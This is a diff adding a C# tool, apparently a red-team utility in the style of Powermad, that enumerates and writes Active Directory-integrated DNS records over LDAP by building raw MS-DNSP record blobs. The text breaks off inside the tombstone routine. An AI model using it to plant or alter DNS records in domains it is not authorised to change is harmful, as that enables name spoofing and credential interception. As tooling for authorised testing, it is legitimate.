@@ -1,0 +1,1267 @@
+using System;
+using System.Collections.Generic;
+using System.DirectoryServices;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+
+namespace SharpADIDNS
+{
+    // -----------------------------------------------------------------------
+    // Exit codes
+    // -----------------------------------------------------------------------
+    internal static class ExitCodes
+    {
+        public const int Success      = 0;
+        public const int UsageError   = 1;
+        public const int LdapError    = 2;
+        public const int NotFound     = 3;
+        public const int AccessDenied = 4;
+    }
+
+    // -----------------------------------------------------------------------
+    // Entry point
+    // -----------------------------------------------------------------------
+    internal static class Program
+    {
+        private static int Main(string[] args)
+        {
+            try
+            {
+                if (args == null || args.Length == 0)
+                {
+                    Options.PrintUsage();
+                    return ExitCodes.UsageError;
+                }
+
+                Options opt = Options.Parse(args);
+
+                if (opt.ShowHelp)
+                {
+                    Options.PrintUsage();
+                    return ExitCodes.Success;
+                }
+
+                if (string.IsNullOrWhiteSpace(opt.Action))
+                {
+                    Logger.Err("No action specified (expected: enum | query | add | disable | remove)");
+                    return ExitCodes.UsageError;
+                }
+
+                if (string.IsNullOrWhiteSpace(opt.Zone))
+                {
+                    Logger.Err("--zone is required");
+                    return ExitCodes.UsageError;
+                }
+
+                if (string.IsNullOrWhiteSpace(opt.DomainDn))
+                {
+                    Logger.Err("--domain-dn is required");
+                    return ExitCodes.UsageError;
+                }
+
+                string zoneDn = LdapOps.BuildZoneDn(opt.Zone, opt.Partition, opt.DomainDn);
+
+                Logger.Verbose(opt, "Action:     {0}", opt.Action);
+                Logger.Verbose(opt, "Zone DN:    {0}", zoneDn);
+                if (!string.IsNullOrWhiteSpace(opt.Server))
+                    Logger.Verbose(opt, "LDAP DC:    {0}", opt.Server);
+                if (!string.IsNullOrWhiteSpace(opt.Username))
+                    Logger.Verbose(opt, "Bind user:  {0}", opt.Username);
+                Logger.Verbose(opt, "Transport:  {0}", opt.Ldaps ? "LDAPS (port 636)" : "LDAP (port 389)");
+
+                switch (opt.Action)
+                {
+                    case "enum":
+                        return Actions.RunEnum(opt, zoneDn);
+
+                    case "query":
+                        if (RequireName(opt) != 0) return ExitCodes.UsageError;
+                        return Actions.RunQuery(opt, zoneDn);
+
+                    case "add":
+                        if (RequireName(opt) != 0) return ExitCodes.UsageError;
+                        if (string.IsNullOrWhiteSpace(opt.Data) && string.IsNullOrWhiteSpace(opt.RawBase64))
+                        {
+                            Logger.Err("add requires --data <value> or --raw <base64>");
+                            return ExitCodes.UsageError;
+                        }
+                        return Actions.RunAdd(opt, zoneDn);
+
+                    case "disable":
+                        if (RequireName(opt) != 0) return ExitCodes.UsageError;
+                        return Actions.RunDisable(opt, zoneDn);
+
+                    case "remove":
+                        if (RequireName(opt) != 0) return ExitCodes.UsageError;
+                        return Actions.RunRemove(opt, zoneDn);
+
+                    default:
+                        Logger.Err("Unknown action: {0}", opt.Action);
+                        return ExitCodes.UsageError;
+                }
+            }
+            catch (DirectoryServicesCOMException ex)
+            {
+                ErrorReporter.PrintCom(ex);
+                return ErrorReporter.ToExitCode(ex);
+            }
+            catch (ArgumentException ex)
+            {
+                Logger.Err("{0}", ex.Message);
+                return ExitCodes.UsageError;
+            }
+            catch (FormatException ex)
+            {
+                Logger.Err("Format error: {0}", ex.Message);
+                return ExitCodes.UsageError;
+            }
+            catch (Exception ex)
+            {
+                Logger.Err("Error: {0}", ex.Message);
+                if (ex.InnerException != null)
+                    Logger.Err("Inner: {0}", ex.InnerException.Message);
+                return ExitCodes.LdapError;
+            }
+        }
+
+        private static int RequireName(Options opt)
+        {
+            if (string.IsNullOrWhiteSpace(opt.Name))
+            {
+                Logger.Err("{0} requires --name <label>", opt.Action);
+                return 1;
+            }
+            return 0;
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // Output helpers (respect --quiet / --verbose)
+    // -----------------------------------------------------------------------
+    internal static class Logger
+    {
+        public static void Info(Options opt, string fmt, params object[] args)
+        {
+            if (opt != null && opt.Quiet) return;
+            Console.WriteLine("[*] " + fmt, args);
+        }
+
+        public static void Ok(string fmt, params object[] args)
+        {
+            Console.WriteLine("[+] " + fmt, args);
+        }
+
+        public static void Verbose(Options opt, string fmt, params object[] args)
+        {
+            if (opt == null || !opt.Verbose) return;
+            Console.WriteLine("[v] " + fmt, args);
+        }
+
+        public static void Warn(string fmt, params object[] args)
+        {
+            Console.Error.WriteLine("[!] " + fmt, args);
+        }
+
+        public static void Err(string fmt, params object[] args)
+        {
+            Console.Error.WriteLine("[-] " + fmt, args);
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // LDAP helpers
+    // -----------------------------------------------------------------------
+    internal static class LdapOps
+    {
+        public static string BuildZoneDn(string zone, string partition, string domainDn)
+        {
+            if (partition.Equals("DomainDnsZones", StringComparison.OrdinalIgnoreCase))
+                return "DC=" + EscapeRdn(zone) + ",CN=MicrosoftDNS,DC=DomainDnsZones," + domainDn;
+            if (partition.Equals("ForestDnsZones", StringComparison.OrdinalIgnoreCase))
+                return "DC=" + EscapeRdn(zone) + ",CN=MicrosoftDNS,DC=ForestDnsZones," + domainDn;
+            if (partition.Equals("System", StringComparison.OrdinalIgnoreCase))
+                return "DC=" + EscapeRdn(zone) + ",CN=MicrosoftDNS,CN=System," + domainDn;
+            throw new ArgumentException(
+                "Unsupported --partition: " + partition +
+                " (expected DomainDnsZones, ForestDnsZones, or System)");
+        }
+
+        public static string Path(Options opt, string dn)
+        {
+            if (string.IsNullOrWhiteSpace(opt.Server))
+                return "LDAP://" + dn;
+            return "LDAP://" + opt.Server + "/" + dn;
+        }
+
+        public static AuthenticationTypes Auth(Options opt)
+        {
+            AuthenticationTypes t = AuthenticationTypes.Secure;
+            if (opt.Ldaps) t |= AuthenticationTypes.SecureSocketsLayer;
+            if (!string.IsNullOrWhiteSpace(opt.Server)) t |= AuthenticationTypes.ServerBind;
+            return t;
+        }
+
+        public static DirectoryEntry Open(Options opt, string dn)
+        {
+            string path = Path(opt, dn);
+            if (string.IsNullOrWhiteSpace(opt.Username))
+                return new DirectoryEntry(path, null, null, Auth(opt));
+            return new DirectoryEntry(path, opt.Username, opt.Password, Auth(opt));
+        }
+
+        public static bool TryBind(DirectoryEntry entry, out DirectoryServicesCOMException error)
+        {
+            try
+            {
+                object _ = entry.NativeObject;
+                error = null;
+                return true;
+            }
+            catch (DirectoryServicesCOMException ex)
+            {
+                error = ex;
+                return false;
+            }
+        }
+
+        public static string EscapeRdn(string value)
+        {
+            // RFC 4514 RDN escapes plus the leading '#' and trailing ' ' cases
+            // are handled by the directory at write time; we cover the chars
+            // that show up inside DNS labels people put on the CLI.
+            return value.Replace("\\", "\\5c")
+                        .Replace(",", "\\2c")
+                        .Replace("+", "\\2b")
+                        .Replace("\"", "\\22")
+                        .Replace("<", "\\3c")
+                        .Replace(">", "\\3e")
+                        .Replace(";", "\\3b")
+                        .Replace("=", "\\3d")
+                        .Replace("#", "\\23");
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // DirectoryServicesCOMException dissection
+    // -----------------------------------------------------------------------
+    internal static class ErrorReporter
+    {
+        // ADSI HRESULTs (winerror.h / activeds.h)
+        private const int LDAP_NO_SUCH_OBJECT       = unchecked((int)0x80072030);
+        private const int LDAP_INSUFFICIENT_RIGHTS  = unchecked((int)0x80072098);
+        private const int LDAP_ALREADY_EXISTS       = unchecked((int)0x80071392);
+        private const int LDAP_INVALID_CREDENTIALS  = unchecked((int)0x8007052E);
+        private const int LDAP_SERVER_DOWN          = unchecked((int)0x8007203A);
+        private const int E_ACCESSDENIED            = unchecked((int)0x80070005);
+
+        public static bool IsNotFound(DirectoryServicesCOMException ex)
+        {
+            return ex != null && ex.ErrorCode == LDAP_NO_SUCH_OBJECT;
+        }
+
+        public static bool IsAccessDenied(DirectoryServicesCOMException ex)
+        {
+            if (ex == null) return false;
+            return ex.ErrorCode == LDAP_INSUFFICIENT_RIGHTS
+                || ex.ErrorCode == E_ACCESSDENIED
+                || ex.ErrorCode == LDAP_INVALID_CREDENTIALS;
+        }
+
+        public static bool IsAlreadyExists(DirectoryServicesCOMException ex)
+        {
+            return ex != null && ex.ErrorCode == LDAP_ALREADY_EXISTS;
+        }
+
+        public static int ToExitCode(DirectoryServicesCOMException ex)
+        {
+            if (IsNotFound(ex))     return ExitCodes.NotFound;
+            if (IsAccessDenied(ex)) return ExitCodes.AccessDenied;
+            return ExitCodes.LdapError;
+        }
+
+        public static void PrintCom(DirectoryServicesCOMException ex)
+        {
+            Logger.Err("LDAP error: {0}", ex.Message);
+            Console.Error.WriteLine("[-]   HRESULT:       0x{0:X8}", ex.ErrorCode);
+            if (ex.ExtendedError != 0)
+                Console.Error.WriteLine("[-]   ExtendedError: 0x{0:X} ({0})", ex.ExtendedError);
+            if (!string.IsNullOrEmpty(ex.ExtendedErrorMessage))
+                Console.Error.WriteLine("[-]   ExtendedMsg:   {0}", ex.ExtendedErrorMessage);
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // dnsRecord blob builders and parser (MS-DNSP DNS_RPC_RECORD)
+    // -----------------------------------------------------------------------
+    internal static class DnsRecord
+    {
+        public const ushort TypeZero  = 0x0000; // tombstone
+        public const ushort TypeA     = 0x0001;
+        public const ushort TypeNs    = 0x0002;
+        public const ushort TypeCname = 0x0005;
+        public const ushort TypeSoa   = 0x0006;
+        public const ushort TypePtr   = 0x000C;
+        public const ushort TypeMx    = 0x000F;
+        public const ushort TypeTxt   = 0x0010;
+        public const ushort TypeAaaa  = 0x001C;
+        public const ushort TypeSrv   = 0x0021;
+
+        public static string TypeName(ushort t)
+        {
+            switch (t)
+            {
+                case TypeZero:  return "TS";
+                case TypeA:     return "A";
+                case TypeNs:    return "NS";
+                case TypeCname: return "CNAME";
+                case TypeSoa:   return "SOA";
+                case TypePtr:   return "PTR";
+                case TypeMx:    return "MX";
+                case TypeTxt:   return "TXT";
+                case TypeAaaa:  return "AAAA";
+                case TypeSrv:   return "SRV";
+                default:        return "Type" + t;
+            }
+        }
+
+        public static ushort GetType(byte[] data)
+        {
+            if (data == null || data.Length < 4) return 0xFFFF;
+            return Bin.ReadU16Le(data, 2);
+        }
+
+        public static byte[] BuildA(IPAddress ip, int ttl)
+        {
+            if (ip.AddressFamily != AddressFamily.InterNetwork)
+                throw new ArgumentException("BuildA requires an IPv4 address");
+            byte[] data = ip.GetAddressBytes();
+            return BuildHeader(TypeA, data, ttl);
+        }
+
+        public static byte[] BuildAaaa(IPAddress ip, int ttl)
+        {
+            if (ip.AddressFamily != AddressFamily.InterNetworkV6)
+                throw new ArgumentException("BuildAaaa requires an IPv6 address");
+            byte[] data = ip.GetAddressBytes();
+            return BuildHeader(TypeAaaa, data, ttl);
+        }
+
+        public static byte[] BuildCname(string target, int ttl)
+        {
+            if (string.IsNullOrWhiteSpace(target))
+                throw new ArgumentException("CNAME target cannot be empty");
+            byte[] data = EncodeCountName(target);
+            return BuildHeader(TypeCname, data, ttl);
+        }
+
+        public static byte[] BuildTxt(string text, int ttl)
+        {
+            if (text == null) text = "";
+            byte[] raw = Encoding.ASCII.GetBytes(text);
+            if (raw.Length > 255)
+                throw new ArgumentException(
+                    "TXT data exceeds 255 bytes; use --raw to inject multi-string TXT");
+            byte[] data = new byte[1 + raw.Length];
+            data[0] = (byte)raw.Length;
+            Buffer.BlockCopy(raw, 0, data, 1, raw.Length);
+            return BuildHeader(TypeTxt, data, ttl);
+        }
+
+        public static byte[] BuildTombstone()
+        {
+            // DNS_RPC_RECORD_TS per MS-DNSP: type=0, datalen=8, data = EntombedTime FILETIME LE
+            long ft = DateTime.UtcNow.ToFileTimeUtc();
+            byte[] data = BitConverter.GetBytes(ft);
+            if (!BitConverter.IsLittleEndian) Array.Reverse(data);
+            return BuildHeader(TypeZero, data, 0);
+        }
+
+        private static byte[] BuildHeader(ushort type, byte[] data, int ttl)
+        {
+            byte[] record = new byte[24 + data.Length];
+            Bin.WriteU16Le(record, 0, (ushort)data.Length);   // DataLength
+            Bin.WriteU16Le(record, 2, type);                  // Type
+            record[4] = 0x05;                                 // Version
+            record[5] = 0xF0;                                 // Rank = DNS_RANK_ZONE
+            Bin.WriteU16Le(record, 6, 0);                     // Flags
+            Bin.WriteU32Le(record, 8, 1);                     // Serial
+            Bin.WriteU32Be(record, 12, (uint)ttl);            // TTL (big-endian)
+            Bin.WriteU32Le(record, 16, 0);                    // Reserved
+            Bin.WriteU32Le(record, 20, 0);                    // Timestamp 0 = static
+            Buffer.BlockCopy(data, 0, record, 24, data.Length);
+            return record;
+        }
+
+        // DNS_COUNT_NAME per MS-DNSP 2.2.2.2.2 (matches Powermad / krbrelayx)
+        private static byte[] EncodeCountName(string name)
+        {
+            if (name.EndsWith("."))
+                name = name.Substring(0, name.Length - 1);
+            string[] labels = name.Split('.');
+
+            using (MemoryStream ms = new MemoryStream())
+            {
+                foreach (string label in labels)
+                {
+                    byte[] lbl = Encoding.ASCII.GetBytes(label);
+                    if (lbl.Length == 0)
+                        throw new ArgumentException("Empty DNS label in: " + name);
+                    if (lbl.Length > 63)
+                        throw new ArgumentException("DNS label exceeds 63 bytes: " + label);
+                    ms.WriteByte((byte)lbl.Length);
+                    ms.Write(lbl, 0, lbl.Length);
+                }
+                ms.WriteByte(0);
+
+                byte[] body = ms.ToArray();
+                if (body.Length > 255)
+                    throw new ArgumentException("Encoded DNS name exceeds 255 bytes: " + name);
+
+                byte[] result = new byte[2 + body.Length];
+                result[0] = (byte)body.Length;     // cchNameLength
+                result[1] = (byte)labels.Length;   // bLabelCount
+                Buffer.BlockCopy(body, 0, result, 2, body.Length);
+                return result;
+            }
+        }
+
+        public static string DecodeCountName(byte[] data, int offset)
+        {
+            if (offset + 2 > data.Length) return "<short>";
+            byte count = data[offset + 1];
+            int p = offset + 2;
+            StringBuilder sb = new StringBuilder();
+            for (int i = 0; i < count; i++)
+            {
+                if (p >= data.Length) break;
+                byte len = data[p++];
+                if (len == 0) break;
+                if (p + len > data.Length) break;
+                if (sb.Length > 0) sb.Append('.');
+                sb.Append(Encoding.ASCII.GetString(data, p, len));
+                p += len;
+            }
+            return sb.ToString();
+        }
+
+        public static string DecodeTxt(byte[] data, int offset, int len)
+        {
+            StringBuilder sb = new StringBuilder();
+            int end = offset + len;
+            int p = offset;
+            while (p < end)
+            {
+                byte s = data[p++];
+                if (p + s > end) break;
+                if (sb.Length > 0) sb.Append(" | ");
+                sb.Append(Encoding.ASCII.GetString(data, p, s));
+                p += s;
+            }
+            return sb.ToString();
+        }
+
+        public static string SummaryLine(byte[] data)
+        {
+            if (data == null || data.Length < 24) return "<short>";
+            ushort type = GetType(data);
+            ushort dataLength = Bin.ReadU16Le(data, 0);
+            uint ttl = Bin.ReadU32Be(data, 12);
+
+            string val;
+            switch (type)
+            {
+                case TypeA:
+                    val = (data.Length >= 28)
+                        ? string.Format("{0}.{1}.{2}.{3}", data[24], data[25], data[26], data[27])
+                        : "<malformed>";
+                    break;
+                case TypeAaaa:
+                    if (dataLength == 16 && data.Length >= 40)
+                    {
+                        byte[] addr = new byte[16];
+                        Buffer.BlockCopy(data, 24, addr, 0, 16);
+                        val = new IPAddress(addr).ToString();
+                    }
+                    else val = "<malformed>";
+                    break;
+                case TypeCname:
+                case TypePtr:
+                case TypeNs:
+                    val = DecodeCountName(data, 24);
+                    break;
+                case TypeTxt:
+                    val = "\"" + DecodeTxt(data, 24, dataLength) + "\"";
+                    break;
+                case TypeZero:
+                    val = "<tombstone>";
+                    break;
+                default:
+                    val = "<" + dataLength + " bytes>";
+                    break;
+            }
+            return string.Format("{0} (ttl={1})", val, ttl);
+        }
+
+        public static void Decode(byte[] data, string indent)
+        {
+            if (data.Length < 24)
+            {
+                Console.WriteLine("{0}<record too short: {1} bytes>", indent, data.Length);
+                return;
+            }
+
+            ushort dataLength = Bin.ReadU16Le(data, 0);
+            ushort type       = Bin.ReadU16Le(data, 2);
+            byte version      = data[4];
+            byte rank         = data[5];
+            ushort flags      = Bin.ReadU16Le(data, 6);
+            uint serial       = Bin.ReadU32Le(data, 8);
+            uint ttl          = Bin.ReadU32Be(data, 12);
+            uint reserved     = Bin.ReadU32Le(data, 16);
+            uint timestamp    = Bin.ReadU32Le(data, 20);
+
+            Console.WriteLine("{0}Type:       {1} ({2})", indent, TypeName(type), type);
+            Console.WriteLine("{0}DataLength: {1}", indent, dataLength);
+            Console.WriteLine("{0}Version:    {1}", indent, version);
+            Console.WriteLine("{0}Rank:       0x{1:X2}", indent, rank);
+            Console.WriteLine("{0}Flags:      0x{1:X4}", indent, flags);
+            Console.WriteLine("{0}Serial:     {1}", indent, serial);
+            Console.WriteLine("{0}TTL:        {1}", indent, ttl);
+            Console.WriteLine("{0}Timestamp:  {1}{2}", indent, timestamp,
+                timestamp == 0 ? " (static)" : " (hours since 1601-01-01)");
+
+            if (data.Length < 24 + dataLength) return;
+
+            switch (type)
+            {
+                case TypeA:
+                    if (dataLength == 4 && data.Length >= 28)
+                        Console.WriteLine("{0}A:          {1}.{2}.{3}.{4}",
+                            indent, data[24], data[25], data[26], data[27]);
+                    break;
+                case TypeAaaa:
+                    if (dataLength == 16 && data.Length >= 40)
+                    {
+                        byte[] addr = new byte[16];
+                        Buffer.BlockCopy(data, 24, addr, 0, 16);
+                        Console.WriteLine("{0}AAAA:       {1}", indent, new IPAddress(addr));
+                    }
+                    break;
+                case TypeCname:
+                    Console.WriteLine("{0}CNAME:      {1}", indent, DecodeCountName(data, 24));
+                    break;
+                case TypePtr:
+                    Console.WriteLine("{0}PTR:        {1}", indent, DecodeCountName(data, 24));
+                    break;
+                case TypeNs:
+                    Console.WriteLine("{0}NS:         {1}", indent, DecodeCountName(data, 24));
+                    break;
+                case TypeTxt:
+                    Console.WriteLine("{0}TXT:        \"{1}\"", indent, DecodeTxt(data, 24, dataLength));
+                    break;
+                case TypeZero:
+                    if (dataLength == 8)
+                    {
+                        long ft = (long)Bin.ReadU64Le(data, 24);
+                        try
+                        {
+                            DateTime dt = DateTime.FromFileTimeUtc(ft);
+                            Console.WriteLine("{0}Entombed:   {1:u}", indent, dt);
+                        }
+                        catch
+                        {
+                            Console.WriteLine("{0}EntombedRaw: 0x{1:X16}", indent, ft);
+                        }
+                    }
+                    break;
+                default:
+                    byte[] raw = new byte[dataLength];
+                    Buffer.BlockCopy(data, 24, raw, 0, dataLength);
+                    Console.WriteLine("{0}RawData:    {1}", indent, BitConverter.ToString(raw).Replace("-", ""));
+                    break;
+            }
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // Endian helpers
+    // -----------------------------------------------------------------------
+    internal static class Bin
+    {
+        public static void WriteU16Le(byte[] b, int o, ushort v)
+        {
+            b[o]     = (byte)(v & 0xff);
+            b[o + 1] = (byte)((v >> 8) & 0xff);
+        }
+
+        public static void WriteU32Le(byte[] b, int o, uint v)
+        {
+            b[o]     = (byte)(v & 0xff);
+            b[o + 1] = (byte)((v >> 8) & 0xff);
+            b[o + 2] = (byte)((v >> 16) & 0xff);
+            b[o + 3] = (byte)((v >> 24) & 0xff);
+        }
+
+        public static void WriteU32Be(byte[] b, int o, uint v)
+        {
+            b[o]     = (byte)((v >> 24) & 0xff);
+            b[o + 1] = (byte)((v >> 16) & 0xff);
+            b[o + 2] = (byte)((v >> 8) & 0xff);
+            b[o + 3] = (byte)(v & 0xff);
+        }
+
+        public static ushort ReadU16Le(byte[] b, int o)
+        {
+            return (ushort)(b[o] | (b[o + 1] << 8));
+        }
+
+        public static uint ReadU32Le(byte[] b, int o)
+        {
+            return (uint)(b[o]
+                       | (b[o + 1] << 8)
+                       | (b[o + 2] << 16)
+                       | (b[o + 3] << 24));
+        }
+
+        public static uint ReadU32Be(byte[] b, int o)
+        {
+            return (uint)((b[o] << 24)
+                       | (b[o + 1] << 16)
+                       | (b[o + 2] << 8)
+                       |  b[o + 3]);
+        }
+
+        public static ulong ReadU64Le(byte[] b, int o)
+        {
+            ulong lo = ReadU32Le(b, o);
+            ulong hi = ReadU32Le(b, o + 4);
+            return lo | (hi << 32);
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // Action runners
+    // -----------------------------------------------------------------------
+    internal static class Actions
+    {
+        // ------------- enum -------------
+        public static int RunEnum(Options opt, string zoneDn)
+        {
+            using (DirectoryEntry zone = LdapOps.Open(opt, zoneDn))
+            {
+                DirectoryServicesCOMException err;
+                if (!LdapOps.TryBind(zone, out err))
+                {
+                    if (ErrorReporter.IsNotFound(err))
+                        Logger.Err("Zone not found: {0}", zoneDn);
+                    else
+                        ErrorReporter.PrintCom(err);
+                    return ErrorReporter.ToExitCode(err);
+                }
+
+                Logger.Info(opt, "Enumerating dnsNode objects under: {0}", zoneDn);
+
+                using (DirectorySearcher searcher = new DirectorySearcher(zone))
+                {
+                    searcher.Filter = "(objectClass=dnsNode)";
+                    searcher.SearchScope = SearchScope.OneLevel;
+                    searcher.PageSize = 1000;
+                    searcher.PropertiesToLoad.Add("name");
+                    searcher.PropertiesToLoad.Add("distinguishedName");
+                    searcher.PropertiesToLoad.Add("dnsRecord");
+                    searcher.PropertiesToLoad.Add("dNSTombstoned");
+
+                    int total = 0, active = 0, tombstoned = 0;
+                    using (SearchResultCollection results = searcher.FindAll())
+                    {
+                        foreach (SearchResult r in results)
+                        {
+                            total++;
+                            string name = Prop(r, "name");
+                            string tomb = Prop(r, "dNSTombstoned");
+                            bool isTomb = tomb.Equals("True", StringComparison.OrdinalIgnoreCase);
+                            if (isTomb) tombstoned++; else active++;
+
+                            Console.WriteLine();
+                            Console.WriteLine("[+] {0}{1}", name, isTomb ? "  [TOMBSTONED]" : "");
+                            if (opt.Verbose)
+                                Console.WriteLine("    DN: {0}", Prop(r, "distinguishedName"));
+
+                            if (!r.Properties.Contains("dnsRecord") || r.Properties["dnsRecord"].Count == 0)
+                            {
+                                Console.WriteLine("    <no records>");
+                                continue;
+                            }
+
+                            foreach (object o in r.Properties["dnsRecord"])
+                            {
+                                byte[] data = o as byte[];
+                                if (data == null) continue;
+                                ushort t = DnsRecord.GetType(data);
+                                Console.WriteLine("    {0,-6} {1}", DnsRecord.TypeName(t), DnsRecord.SummaryLine(data));
+                            }
+                        }
+                    }
+
+                    Console.WriteLine();
+                    Logger.Ok("Total: {0} nodes ({1} active, {2} tombstoned)", total, active, tombstoned);
+                }
+            }
+            return ExitCodes.Success;
+        }
+
+        // ------------- query -------------
+        public static int RunQuery(Options opt, string zoneDn)
+        {
+            string nodeDn = "DC=" + LdapOps.EscapeRdn(opt.Name) + "," + zoneDn;
+            Logger.Verbose(opt, "Node DN:    {0}", nodeDn);
+
+            using (DirectoryEntry node = LdapOps.Open(opt, nodeDn))
+            {
+                DirectoryServicesCOMException err;
+                if (!LdapOps.TryBind(node, out err))
+                {
+                    if (ErrorReporter.IsNotFound(err))
+                    {
+                        Logger.Err("Node not found: {0}", nodeDn);
+                        return ExitCodes.NotFound;
+                    }
+                    ErrorReporter.PrintCom(err);
+                    return ErrorReporter.ToExitCode(err);
+                }
+
+                Logger.Ok("Found node");
+                Logger.Ok("DN: {0}", nodeDn);
+
+                PrintProperty(node, "distinguishedName");
+                PrintProperty(node, "name");
+                PrintProperty(node, "dNSTombstoned");
+                PrintProperty(node, "whenCreated");
+                PrintProperty(node, "whenChanged");
+
+                if (!node.Properties.Contains("dnsRecord") || node.Properties["dnsRecord"].Count == 0)
+                {
+                    Logger.Info(opt, "dnsRecord: <empty>");
+                    return ExitCodes.Success;
+                }
+
+                for (int i = 0; i < node.Properties["dnsRecord"].Count; i++)
+                {
+                    byte[] data = node.Properties["dnsRecord"][i] as byte[];
+                    if (data == null) continue;
+
+                    Console.WriteLine();
+                    Console.WriteLine("[*] dnsRecord[{0}]", i);
+                    if (opt.Verbose)
+                        Console.WriteLine("    Base64: {0}", Convert.ToBase64String(data));
+                    DnsRecord.Decode(data, "    ");
+                }
+            }
+            return ExitCodes.Success;
+        }
+
+        // ------------- add -------------
+        public static int RunAdd(Options opt, string zoneDn)
+        {
+            byte[] record;
+            ushort recordType;
+            string dataDesc;
+
+            if (!string.IsNullOrWhiteSpace(opt.RawBase64))
+            {
+                try
+                {
+                    record = Convert.FromBase64String(opt.RawBase64);
+                }
+                catch (FormatException)
+                {
+                    throw new ArgumentException("--raw is not valid base64");
+                }
+                if (record.Length < 24)
+                    throw new ArgumentException("--raw record is too short (need >= 24 bytes of header)");
+                recordType = DnsRecord.GetType(record);
+                dataDesc = string.Format("<raw {0}-byte {1} record>", record.Length, DnsRecord.TypeName(recordType));
+            }
+            else
+            {
+                string t = opt.RecordType.ToUpperInvariant();
+                IPAddress ip;
+                switch (t)
+                {
+                    case "A":
+                        if (!IPAddress.TryParse(opt.Data, out ip) || ip.AddressFamily != AddressFamily.InterNetwork)
+                            throw new ArgumentException("--type A requires an IPv4 address in --data");
+                        record = DnsRecord.BuildA(ip, opt.Ttl);
+                        recordType = DnsRecord.TypeA;
+                        dataDesc = ip.ToString();
+                        break;
+                    case "AAAA":
+                        if (!IPAddress.TryParse(opt.Data, out ip) || ip.AddressFamily != AddressFamily.InterNetworkV6)
+                            throw new ArgumentException("--type AAAA requires an IPv6 address in --data");
+                        record = DnsRecord.BuildAaaa(ip, opt.Ttl);
+                        recordType = DnsRecord.TypeAaaa;
+                        dataDesc = ip.ToString();
+                        break;
+                    case "CNAME":
+                        record = DnsRecord.BuildCname(opt.Data, opt.Ttl);
+                        recordType = DnsRecord.TypeCname;
+                        dataDesc = opt.Data;
+                        break;
+                    case "TXT":
+                        record = DnsRecord.BuildTxt(opt.Data, opt.Ttl);
+                        recordType = DnsRecord.TypeTxt;
+                        dataDesc = "\"" + opt.Data + "\"";
+                        break;
+                    default:
+                        throw new ArgumentException(
+                            "Unsupported --type: " + opt.RecordType +
+                            " (expected A, AAAA, CNAME, TXT, or use --raw)");
+                }
+            }
+
+            string nodeRdn = "DC=" + LdapOps.EscapeRdn(opt.Name);
+            string nodeDn  = nodeRdn + "," + zoneDn;
+            Logger.Verbose(opt, "Node DN:    {0}", nodeDn);
+            Logger.Verbose(opt, "Record hex: {0}", BitConverter.ToString(record).Replace("-", ""));
+
+            using (DirectoryEntry zone = LdapOps.Open(opt, zoneDn))
+            {
+                DirectoryServicesCOMException zoneErr;
+                if (!LdapOps.TryBind(zone, out zoneErr))
+                {
+                    if (ErrorReporter.IsNotFound(zoneErr))
+                        Logger.Err("Zone not found: {0}", zoneDn);
+                    else
+                        ErrorReporter.PrintCom(zoneErr);
+                    return ErrorReporter.ToExitCode(zoneErr);
+                }
+
+                bool nodeExists;
+                using (DirectoryEntry node = LdapOps.Open(opt, nodeDn))
+                {
+                    DirectoryServicesCOMException nodeErr;
+                    if (LdapOps.TryBind(node, out nodeErr))
+                    {
+                        nodeExists = true;
+                        if (!opt.Force)
+                        {
+                            Logger.Err("Node already exists: {0}", nodeDn);
+                            Logger.Err("Use --force to replace records of type {0} on this node",
+                                DnsRecord.TypeName(recordType));
+                            return ExitCodes.UsageError;
+                        }
+
+                        // B1 fix: preserve other record types on the same node
+                        ReplaceSameTypeRecord(node, record, recordType);
+                        SetTombstoneFalse(node);
+                        node.CommitChanges();
+
+                        Logger.Ok("Updated {0} record", DnsRecord.TypeName(recordType));
+                        Logger.Ok("{0}.{1} -> {2}", opt.Name, opt.Zone, dataDesc);
+                        Logger.Ok("DN: {0}", nodeDn);
+                        return ExitCodes.Success;
+                    }
+
+                    // B2 fix: only fall through to "create" when the node is truly absent;
+                    // for ACCESS_DENIED / SERVER_DOWN / etc. bail out with the real error.
+                    if (!ErrorReporter.IsNotFound(nodeErr))
+                    {
+                        ErrorReporter.PrintCom(nodeErr);
+                        return ErrorReporter.ToExitCode(nodeErr);
+                    }
+                    nodeExists = false;
+                }
+
+                if (!nodeExists)
+                {
+                    using (DirectoryEntry newNode = zone.Children.Add(nodeRdn, "dnsNode"))
+                    {
+                        newNode.Properties["dnsRecord"].Add(record);
+                        newNode.Properties["dNSTombstoned"].Add(false);
+                        newNode.CommitChanges();
+
+                        Logger.Ok("Added {0} record", DnsRecord.TypeName(recordType));
+                        Logger.Ok("{0}.{1} -> {2}", opt.Name, opt.Zone, dataDesc);
+                        Logger.Ok("DN: {0}", nodeDn);
+                    }
+                }
+            }
+            return ExitCodes.Success;
+        }
+
+        private static void ReplaceSameTypeRecord(DirectoryEntry node, byte[] newRecord, ushort recordType)
+        {
+            List<byte[]> keep = new List<byte[]>();
+            if (node.Properties.Contains("dnsRecord"))
+            {
+                foreach (object o in node.Properties["dnsRecord"])
+                {
+                    byte[] b = o as byte[];
+                    if (b == null) continue;
+                    ushort t = DnsRecord.GetType(b);
+                    if (t == recordType) continue;            // drop same type
+                    if (t == DnsRecord.TypeZero) continue;    // drop stale tombstone TS records
+                    keep.Add(b);
+                }
+            }
+            node.Properties["dnsRecord"].Clear();
+            foreach (byte[] b in keep)
+                node.Properties["dnsRecord"].Add(b);
+            node.Properties["dnsRecord"].Add(newRecord);
+        }
+
+        // ------------- disable (tombstone) -------------
+        public static int RunDisable(Options opt, string zoneDn)
+        {
+            string nodeDn = "DC=" + LdapOps.EscapeRdn(opt.Name) + "," + zoneDn;
+            Logger.Verbose(opt, "Node DN:    {0}", nodeDn);
+
+            using (DirectoryEntry node = LdapOps.Open(opt, nodeDn))
+            {
+                DirectoryServicesCOMException err;
+                if (!LdapOps.TryBind(node, out err))
+                {
+                    if (ErrorReporter.IsNotFound(err))
+                    {
+                        Logger.Err("Node not found: {0}", nodeDn);
+                        return ExitCodes.NotFound;
+                    }
+                    ErrorReporter.PrintCom(err);
+                    return ErrorReporter.ToExitCode(err);
+                }
+
+                byte[] tomb = DnsRecord.BuildTombstone();
+                node.Properties["dnsRecord"].Clear();
+                node.Properties["dnsRecord"].Add(tomb);
+
+                if (node.Properties.Contains("dNSTombstoned"))
